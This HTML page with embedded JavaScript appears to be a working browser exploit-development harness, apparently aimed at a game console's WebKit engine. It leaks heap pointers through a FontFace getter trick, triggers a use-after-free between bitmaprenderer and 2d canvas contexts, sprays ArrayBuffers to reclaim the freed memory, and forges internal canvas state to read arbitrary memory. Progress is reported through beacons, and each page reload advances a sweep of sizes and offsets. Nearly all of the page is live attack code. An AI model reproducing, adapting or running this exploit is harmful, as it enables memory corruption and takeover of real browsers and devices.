<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1158 - Oracle Reclaim Discriminator</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
h2{color:#00ff88;font-size:14px;margin:6px 0}
#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
.hit{color:#ff00ff;font-weight:bold}.ptr{color:#ff0;font-weight:bold}
</style>
</head><body>
<h2>P1158 Oracle Reclaim Discriminator (V650 replication + FL anchor)</h2>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),T0=Date.now();
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1158-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8),_bu;
try{_bu=new BigUint64Array(_b8);}catch(e){}
function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}
_f64[0]=v;return '0x'+_u32[1].toString(16).padStart(8,'0')+_u32[0].toString(16).padStart(8,'0');}

/* ═══════════════════════════════════════════════════════════════════════
   P1158: Replicate pastawithpesto V650/V655 crash oracle ON OUR CONSOLE.

   Their technique (v650/v655, confirmed on their 14.10 console):
   1. BMR outer + alpha getter + 2d inner → frees 768B context
   2. Flush 600 x AB(16) (forces libpas deallocation-log flush)
   3. Spray 200 x AB(768) → one AB reclaims the freed slot
   4. Forge m_stateStack header at AB offsets: +112 m_buffer (8B),
      +120 m_size, +124 m_capacity
   5. innerCtx.lineWidth → static call reads float64 at m_buffer+48
      (CanvasState.m_lineWidth @ +48). Unmapped target → SIGSEGV.
   6. null wrapper + clear forges → GC-safe → beacon → next stage.

   Our twist: anchor on the FontFace-leaked heap pointer p1/p2
   (P1069v9, ~100% reliable, guaranteed mapped). A returned value =
   reclaim+oracle WORK on our console. Crash = reclaim failed →
   advance through size/offset sweep (crash-resume state machine).

   Our earlier P693-P705 "AB(768) cross-type reclaim DEAD" matrix never
   did the AB(16) flush — this discriminates that difference directly.
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=[
  /* stage: [m_buffer_off, ab_size] */
  [112,768],  /* exact V650 replication */
  [112,736],[112,752],[112,784],[112,800],[112,816],[112,832],
  [104,768],[120,768],[128,768],[136,768],[96,768],[88,768],[80,768],
  [112,896],[112,1024]
];
var stage=0,hits=[];
try{stage=parseInt(localStorage.getItem('p1158_stage')||'0');}catch(e){}
try{var h=localStorage.getItem('p1158_hits');if(h)hits=JSON.parse(h);}catch(e){}
if(!Array.isArray(hits))hits=[];

B('BOOT','stage='+stage+'/'+STAGES.length+'|hits='+JSON.stringify(hits).slice(0,300));

/* ════════ 1. FL LEAK (fresh p1/p2 per boot) ════════ */
function flLeak(cb){
  var done=false;
  var watchdog=setTimeout(function(){
    if(done)return;done=true;B('FL-WATCHDOG');cb(null);},6000);
  function finish(p){if(done)return;done=true;clearTimeout(watchdog);
    try{delete FontFace.prototype.then;}catch(e){}cb(p);}
  try{
    var fired=false,styleEl;
    var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
    document.fonts.add(A);void A.loaded;
    styleEl=document.createElement('style');
    styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
    document.head.appendChild(styleEl);
    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
      get:function(){
        if(fired)return undefined;fired=true;
        if(styleEl)styleEl.remove();
        try{document.fonts.delete(this);}catch(e){}
        document.body.offsetHeight;          /* v9: force layout — REQUIRED */
        window.__map=[];
        for(var k=0;k<120;k++){var ab=new ArrayBuffer(192);
          window.__map.push({view:new Uint8Array(ab)});}
        try{document.fonts.check('1em s0');}catch(e){}  /* v9: engine touch — REQUIRED */
        return undefined;
      },set:function(){}});
    document.fonts.load('1em f0, s0','AB');
    setTimeout(function(){
      var found=null;
      for(var pass=0;pass<3&&!found;pass++){
        for(var i=0;i<window.__map.length&&!found;i++){
          var e=window.__map[i];
          var nz=false;
          for(var b=0x58;b<0x60;b++)if(e.view[b])nz=true;
          if(nz){
            var dv=new DataView(e.view.buffer);
            var p1=dv.getBigUint64(0x58,true);
            var p2=dv.getBigUint64(0x68,true);
            if(p1>0x1000000000n&&p1<0x100000000000n){
              found={p1:'0x'+p1.toString(16),p2:'0x'+p2.toString(16),
                lo1:Number(p1&0xFFFFFFFFn),hi1:Number((p1>>32n)&0xFFFFFFFFn),
                lo2:Number(p2&0xFFFFFFFFn),hi2:Number((p2>>32n)&0xFFFFFFFFn)};
            }
          }
        }
        if(!found&&pass<2){var t=Date.now();while(Date.now()-t<150){}}
      }
      if(found){B('FL-HIT','p1='+found.p1+'|p2='+found.p2);}
      else{B('FL-MISS');}
      finish(found);
    },80);
  }catch(e){B('FL-ERR',e.message);finish(null);}
}

/* ════════ 2. ORACLE ATTEMPT ════════ */
function oracleAttempt(leak){
  var conf=STAGES[stage];
  var off=conf[0],sz=conf[1];
  /* target: p1 for stages<7 (size sweep), p1 for offset sweep, p2 later */
  var useP2 = (stage>=7&&stage<13)||(stage>=15);
  var lo=useP2?leak.lo2:leak.lo1;
  var hi=useP2?leak.hi2:leak.hi1;
  if(!leak){lo=0;hi=0;}

  var th='0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');
  B('TGT','stage='+stage+'|off='+off+'|sz='+sz+'|target='+th);

  /* pre-advance: if we crash, next boot continues */
  try{localStorage.setItem('p1158_stage',''+(stage+1));}catch(e){}

  /* UAF trigger (BMR outer + 2d inner) */
  var canvas=document.createElement('canvas');
  canvas.width=1;canvas.height=1;
  var innerCtx=null;
  var uafOpts={};
  Object.defineProperty(uafOpts,'alpha',{get:function(){
    innerCtx=canvas.getContext('2d');return true;}});
  canvas.getContext('bitmaprenderer',uafOpts);

  if(!innerCtx){B('FAIL','no-inner');setTimeout(function(){location.reload(true);},2000);return;}

  /* flush dealloc log */
  for(var f=0;f<600;f++){var tmp=new ArrayBuffer(16);}

  /* spray */
  var dvs=[];
  for(var s=0;s<200;s++){
    var ab=new ArrayBuffer(sz);
    dvs.push(new DataView(ab));
  }
  B('SPRAY','sz='+sz+'|n=200');

  /* forge m_stateStack in ALL spray ABs */
  for(var w=0;w<dvs.length;w++){
    var dv=dvs[w];
    dv.setUint32(off,lo,true);
    dv.setUint32(off+4,hi,true);
    dv.setUint32(off+8,2,true);   /* m_size */
    dv.setUint32(off+12,1,true);  /* m_capacity */
  }

  /* CRITICAL READ — SIGSEGV here if target unmapped OR reclaim failed
     (destructor nulled m_buffer → read at 0+48) */
  var lw=innerCtx.lineWidth;

  /* ==== SURVIVED: either HIT (mapped target) or reclaim got a sane buffer ==== */
  var lwB=f2big(lw);
  B('READ','stage='+stage+'|off='+off+'|sz='+sz+'|lw='+lwB);
  log('*** READ SURVIVED: lw='+lw+' ('+lwB+') stage='+stage+' off='+off+' sz='+sz+' ***','hit');

  /* multi-field reads through the same forged state */
  var ml=-1,ga=-1,sb=-1;
  try{ml=innerCtx.miterLimit;}catch(e){ml=-888;}
  try{ga=innerCtx.globalAlpha;}catch(e){ga=-888;}
  try{sb=innerCtx.shadowBlur;}catch(e){sb=-888;}
  B('MULTI','ml='+f2big(ml)+'|ga='+f2big(ga)+'|sb='+f2big(sb));

  /* second pass: re-forge target+0x1000 */
  var lo2=(lo+0x1000)>>>0;
  var hi2=hi+(lo+0x1000>0xFFFFFFFF?1:0);
  for(var w2=0;w2<dvs.length;w2++){
    dvs[w2].setUint32(off,lo2,true);
    dvs[w2].setUint32(off+4,hi2,true);
  }
  var lw2=-1,ml2=-1;
  try{lw2=innerCtx.lineWidth;}catch(e){lw2=-888;}
  try{ml2=innerCtx.miterLimit;}catch(e){ml2=-888;}
  B('READ2','lw+4K='+f2big(lw2)+'|ml+4K='+f2big(ml2));

  hits.push({stage:stage,off:off,sz:sz,target:th,lw:lwB,
    ml:f2big(ml),ga:f2big(ga),sb:f2big(sb),lw2:f2big(lw2),ml2:f2big(ml2)});
  try{localStorage.setItem('p1158_hits',JSON.stringify(hits));}catch(e){}

  /* clean for GC safety */
  innerCtx=null;
  for(var c=0;c<dvs.length;c++){
    dvs[c].setFloat64(off,0,true);
    dvs[c].setUint32(off+8,0,true);
    dvs[c].setUint32(off+12,0,true);
  }

  if(stage+1>=STAGES.length){
    B('ALL-DONE','hits='+JSON.stringify(hits).slice(0,700));
    log('=== ALL STAGES DONE ===','ok');
    try{localStorage.removeItem('p1158_stage');}catch(e){}
  }else{
    B('NEXT','reload');
    setTimeout(function(){location.reload(true);},1500);
  }
}

/* ════════ MAIN ════════ */
if(stage>=STAGES.length){
  B('ALL-DONE','hits='+JSON.stringify(hits).slice(0,700));
  log('=== COMPLETE: '+hits.length+' reads survived ===','ok');
  for(var i=0;i<hits.length;i++)log(JSON.stringify(hits[i]),'info');
  try{localStorage.removeItem('p1158_stage');}catch(e){}
}else{
  log('=== Stage '+stage+'/'+STAGES.length+' ===','info');
  flLeak(function(leak){
    if(!leak){
      B('FL-FAIL-RETRY');
      /* retry once more before giving up this boot */
      setTimeout(function(){location.reload(true);},500);
      return;
    }
    oracleAttempt(leak);
  });
}

/* auto-reload checker */
(function(){
  var cur='P1158-oracle-reclaim';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
